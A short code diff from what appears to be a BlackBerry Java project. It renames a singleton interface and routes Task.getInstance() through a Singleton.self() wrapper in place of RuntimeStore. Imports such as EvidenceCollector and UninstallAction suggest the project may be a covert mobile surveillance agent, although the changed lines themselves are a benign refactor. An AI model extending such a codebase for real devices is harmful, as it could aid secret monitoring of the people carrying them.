@@ -14,7 +14,6 @@ import java.util.Timer;
 import java.util.Vector;
 
 import net.rim.device.api.system.CodeModuleManager;
-import net.rim.device.api.system.RuntimeStore;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
 import blackberry.action.UninstallAction;
@@ -23,7 +22,7 @@ import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import blackberry.manager.ActionManager;
 import blackberry.manager.EventManager;
 import blackberry.manager.ModuleManager;
@@ -32,7 +31,7 @@ import blackberry.utils.BlockingQueueTrigger;
 /**
  * The Class Task.
  */
-public final class Task implements Singleton {
+public final class Task implements iSingleton {
 
     private static final int SLEEPING_TIME = 1000;
     private static final long APP_TIMER_PERIOD = 1000;
@@ -51,10 +50,10 @@ public final class Task implements Singleton {
      */
     public static synchronized Task getInstance() {
         if (instance == null) {
-            instance = (Task) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (Task) Singleton.self().get(GUID);
             if (instance == null) {
                 final Task singleton = new Task();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
 
